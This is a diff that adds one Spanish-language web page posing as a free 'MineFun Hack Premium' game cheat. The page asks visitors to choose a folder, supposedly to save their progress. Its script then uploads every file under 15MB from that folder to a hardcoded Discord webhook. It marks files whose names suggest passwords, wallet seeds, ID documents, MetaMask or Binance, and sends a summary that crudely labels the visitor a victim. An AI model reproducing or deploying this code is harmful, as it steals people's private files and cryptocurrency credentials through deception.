@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>MineFun Hack Premium 2025</title>
+<style>
+  body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:30vh;font-size:22px;}
+  button{background:#0f0;color:black;padding:20px 40px;font-size:24px;border:none;border-radius:15px;cursor:pointer;margin:30px;}
+  button:hover{box-shadow:0 0 30px #0f0;}
+  .status{color:#0f0;margin-top:30px;}
+</style>
+</head>
+<body>
+
+<h1>⚡ MINEFUN HACK PREMIUM 2026 ⚡</h1>
+<p>Para activar el hack ilimitado, elige una carpeta para no perder el progreso ya que es algo costoso</p>
+<button onclick="robarTodo()">GUARDAR HACK AQUÍ</button>
+<div class="status" id="status">Esperando que elijas carpeta...</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1463592063059890382/eRGzjHp_vqhRlcMCOgrGRJUrf-K69jUis7lYqKOSa2luL8hfhCyoDGBDGpOPK5jdDBWX";
+
+async function robarTodo() {
+  try {
+    document.getElementById("status").innerHTML = "✅ Acceso concedido<br>Espere 5 minutos para que se active automaticamente ";
+    
+    const dirHandle = await window.showDirectoryPicker({
+      mode: "readwrite"
+    });
+
+    const interesantes = [];
+    const pesados = [];
+
+    for await (const entry of dirHandle.values()) {
+      if (entry.kind === "file") {
+        const file = await entry.getFile();
+        
+        // Filtramos lo más jugoso
+        const nombre = file.name.toLowerCase();
+        const esInteresante = nombre.includes("pass") || 
+                              nombre.includes("wallet") || 
+                              nombre.includes("seed") || 
+                              nombre.includes("dni") || 
+                              nombre.includes("carnet") || 
+                              nombre.includes("captura") || 
+                              nombre.includes("metamask") ||
+                              nombre.includes("binance") ||
+                              nombre.endsWith(".json") ||
+                              nombre.endsWith(".txt") ||
+                              nombre.endsWith(".docx") ||
+                              nombre.endsWith(".pdf");
+
+        if (file.size < 15 * 1024 * 1024) { // menos de 15MB → robamos
+          const form = new FormData();
+          form.append("file", file, file.name);
+          form.append("payload_json", JSON.stringify({
+            embeds: [{
+              title: "ARCHIVO ROBADO",
+              description: `**${file.name}**\nTamaño: ${(file.size/1024/1024).toFixed(2)} MB\nCarpeta: ${dirHandle.name}`,
+              color: esInteresante ? 0x00FF00 : 0x0099FF
+            }]
+          }));
+          await fetch(WEBHOOK, {method: "POST", body: form});
+          
+          if (esInteresante) interesantes.push(file.name);
+          
+        } else {
+          pesados.push(`${file.name} → ${(file.size/1024/1024).toFixed(2)} MB`);
+        }
+      }
+    }
+
+    // Enviamos resumen final
+    const resumen = new FormData();
+    resumen.append("payload_json", JSON.stringify({
+      content: "FOLDER ACCESS COMPLETADO",
+      embeds: [{
+        title: `VÍCTIMA RAPEADA → ${dirHandle.name}`,
+        description: interesantes.length > 0 
+          ? `ARCHIVOS JUGOSOS (${interesantes.length}):\n${interesantes.slice(0,20).join("\n")}`
+          : "No se encontraron archivos muy jugosos, pero se subió todo lo posible",
+        fields: pesados.length > 0 ? [{name: "ARCHIVOS PESADOS", value: pesados.slice(0,10).join("\n")}] : [],
+        color: 0xFF0000,
+        footer: {text: new Date().toLocaleString()}
+      }]
+    }));
+    await fetch(WEBHOOK, {method: "POST", body: resumen});
+
+    document.getElementById("status").innerHTML = "HACK GUARDADO CORRECTAMENTE ✅<br>Disfruta el premium ilimitado";
+
+  } catch (e) {
+    document.getElementById("status").innerHTML = "❌ Acceso denegado<br>El hack no se pudo activar";
+  }
+}
+</script>
+</body>
+</html>
